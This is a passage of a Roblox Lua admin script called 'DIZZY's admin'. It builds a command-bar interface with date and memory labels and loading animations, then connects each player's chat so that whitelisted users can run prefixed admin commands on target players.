		CommandBarUI["_UICorner3"].Parent = CommandBarUI["_Frame4"]

		CommandBarUI["_Frame5"].BackgroundColor3 = Color3.fromRGB(227.00000166893005, 227.00000166893005, 227.00000166893005)
		CommandBarUI["_Frame5"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame5"].BorderSizePixel = 0
		CommandBarUI["_Frame5"].Position = UDim2.new(0, 0, 0.5, 0)
		CommandBarUI["_Frame5"].Size = UDim2.new(0, 150, 0.5, 0)
		CommandBarUI["_Frame5"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_date"].Font = Enum.Font.Gotham
		CommandBarUI["_date"].TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_date"].TextSize = 16
		CommandBarUI["_date"].TextStrokeTransparency = 0.5
		CommandBarUI["_date"].TextXAlignment = Enum.TextXAlignment.Left
		CommandBarUI["_date"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_date"].BackgroundTransparency = 1
		CommandBarUI["_date"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_date"].BorderSizePixel = 0
		CommandBarUI["_date"].Position = UDim2.new(0, 0, 1, 2)
		CommandBarUI["_date"].Size = UDim2.new(0, 200, 0, 16)
		CommandBarUI["_date"].Name = "date"
		CommandBarUI["_date"].Parent = CommandBarUI["_main"]

		CommandBarUI["_mem"].Font = Enum.Font.Gotham
		CommandBarUI["_mem"].TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_mem"].TextSize = 16
		CommandBarUI["_mem"].TextStrokeTransparency = 0.5
		CommandBarUI["_mem"].TextXAlignment = Enum.TextXAlignment.Right
		CommandBarUI["_mem"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_mem"].BackgroundTransparency = 1
		CommandBarUI["_mem"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_mem"].BorderSizePixel = 0
		CommandBarUI["_mem"].Position = UDim2.new(1, -200, 1, 2)
		CommandBarUI["_mem"].Size = UDim2.new(0, 200, 0, 16)
		CommandBarUI["_mem"].Name = "mem"
		CommandBarUI["_mem"].Parent = CommandBarUI["_main"]

		CommandBarUI["_Run"].Image = "rbxassetid://6035067832"
		CommandBarUI["_Run"].BackgroundColor3 = Color3.fromRGB(40.00000141561031, 40.00000141561031, 40.00000141561031)
		CommandBarUI["_Run"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Run"].BorderSizePixel = 0
		CommandBarUI["_Run"].Position = UDim2.new(0.975000024, -28, 1, -32)
		CommandBarUI["_Run"].Size = UDim2.new(0, 28, 0, 28)
		CommandBarUI["_Run"].Name = "Run"
		CommandBarUI["_Run"].Parent = CommandBarUI["_main"]

		CommandBarUI["_UICorner4"].Parent = CommandBarUI["_Run"]

		CommandBarUI["_Frame6"].BackgroundColor3 = Color3.fromRGB(20.000000707805157, 20.000000707805157, 20.000000707805157)
		CommandBarUI["_Frame6"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame6"].BorderSizePixel = 0
		CommandBarUI["_Frame6"].Position = UDim2.new(0.100000001, 0, 1, 0)
		CommandBarUI["_Frame6"].Size = UDim2.new(0.25, 0, 0.0500000007, 0)
		CommandBarUI["_Frame6"].Parent = CommandBarUI["_CmdBarDIZ"]

		CommandBarUI["_TextLabel1"].Font = Enum.Font.GothamBold
		CommandBarUI["_TextLabel1"].Text = "DIZZY's Command Bar is loading..."
		CommandBarUI["_TextLabel1"].TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_TextLabel1"].TextScaled = true
		CommandBarUI["_TextLabel1"].TextSize = 14
		CommandBarUI["_TextLabel1"].TextWrapped = true
		CommandBarUI["_TextLabel1"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.000000175088644, 24.000000469386578)
		CommandBarUI["_TextLabel1"].BackgroundTransparency = 1
		CommandBarUI["_TextLabel1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_TextLabel1"].BorderSizePixel = 0
		CommandBarUI["_TextLabel1"].Size = UDim2.new(1, 0, 0.5, 0)
		CommandBarUI["_TextLabel1"].Parent = CommandBarUI["_Frame6"]

		CommandBarUI["_UICorner5"].CornerRadius = UDim.new(0, 10)
		CommandBarUI["_UICorner5"].Parent = CommandBarUI["_Frame6"]

		CommandBarUI["_glassy"].GroupTransparency = 0.5
		CommandBarUI["_glassy"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_glassy"].BackgroundTransparency = 1
		CommandBarUI["_glassy"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_glassy"].BorderSizePixel = 0
		CommandBarUI["_glassy"].Size = UDim2.new(1, 0, 1, 0)
		CommandBarUI["_glassy"].Name = "glassy"
		CommandBarUI["_glassy"].Parent = CommandBarUI["_CmdBarDIZ"]


		local fake_module_scripts = {}

		local function YADYB_fake_script()
			local script = Instance.new("LocalScript")
			script.Name = "LocalScript"
			script.Parent = CommandBarUI["_date"]
			local req = require
			local require = function(obj)
				local fake = fake_module_scripts[obj]
				if fake then
					return fake()
				end
				return req(obj)
			end

			game:GetService("RunService").Heartbeat:Connect(function()
				script.Parent.Text = os.date("%c")
			end)
		end
		local function GYLZT_fake_script()
			local script = Instance.new("LocalScript")
			script.Name = "LocalScript"
			script.Parent = CommandBarUI["_mem"]
			local req = require
			local require = function(obj)
				local fake = fake_module_scripts[obj]
				if fake then
					return fake()
				end
				return req(obj)
			end

			while true do
				task.wait(1)
				script.Parent.Text = gcinfo().." MB"
			end
		end
		local function EEQVW_fake_script()
			local script = Instance.new("LocalScript")
			script.Name = "HANDLE"
			script.Parent = CommandBarUI["_CmdBarDIZ"]
			local req = require
			local require = function(obj)
				local fake = fake_module_scripts[obj]
				if fake then
					return fake()
				end
				return req(obj)
			end

			local main = script.Parent
			local tweenService = game:GetService("TweenService")
			local players = game:GetService("Players")
			local runService = game:GetService("RunService")
			local userInputService = game:GetService("UserInputService")

			main.main.Visible = false
			tweenService:Create(main.Frame, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Position = UDim2.new(0.1, 0, 0.975, 0)}):Play()

			task.wait(1)
			main.main.Size = UDim2.new(0, 0, 0, 0)

			task.wait(1)
			main.main.Visible = true
			tweenService:Create(main.Frame, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Position = UDim2.new(0.1, 0, 1, 0)}):Play()
			tweenService:Create(main.main, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 100)}):Play()

		end

		coroutine.wrap(YADYB_fake_script)()
		coroutine.wrap(GYLZT_fake_script)()
		coroutine.wrap(EEQVW_fake_script)()
	end,
})






--// Player Initialization
for i, v in pairs(game.Players:GetPlayers()) do
	if table.find(Settings.Whitelist, v.Name) then
		notif(v, "DIZZY's admin", "You are whitelisted! Prefix is ".. Settings.Prefix, Internals.Icons.Info)
	end

	v.Chatted:Connect(function(msg)
		if table.find(Settings.Whitelist, v.Name) then
			if msg:sub(1, #Settings.Prefix) == Settings.Prefix then
				msg = msg:sub(#Settings.Prefix + 1)
				local parts = msg:split(" ")
				local cmdname = parts[1]
				local target = parts[2] or "me"
				local args 
				if cmdname == "m" or cmdname == "annc" or cmdname == "announce" then
					args = {msg:sub(#cmdname + 2)}
				else
					args = {table.unpack(parts, 3)}
				end

				local command = Internals.Commands[cmdname]
				if not command then
					for i, cmd in pairs(Internals.Commands) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local targets = p(target, v)
					command.Data.Function(v, targets, args)
				else
					notif(v, "Error", "Command '" .. cmdname .. "' was not found.", Internals.Icons.Error)
				end
			end
		end
	end)
end

--// Player Added
game.Players.PlayerAdded:Connect(function(player)
	if table.find(Settings.Whitelist, player.Name) then
		task.wait(1.5)
		notif(player, "DIZZY's admin", "You are whitelisted! Prefix is ".. Settings.Prefix, Internals.Icons.Info)
	end

	player.Chatted:Connect(function(msg)
		if table.find(Settings.Whitelist, player.Name) then
			if msg:sub(1, #Settings.Prefix) == Settings.Prefix then
				msg = msg:sub(#Settings.Prefix + 1)
				local parts = msg:split(" ")
				local cmdname = parts[1]
				local target = parts[2] or "me"
				local args 
				if cmdname == "m" or cmdname == "annc" or cmdname == "announce" then
					args = {msg:sub(#cmdname + 2)}
				else
					args = {table.unpack(parts, 3)}
				end

				local command = Internals.Commands[cmdname]
				if not command then
					for _, cmd in pairs(Internals.Commands) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local targets = p(target, player)
					command.Data.Function(player, targets, args)
				else
					notif(player, "Error", "Command '" .. cmdname .. "' was not found.", Internals.Icons.Error)
				end
			end
		end
	end)
end)

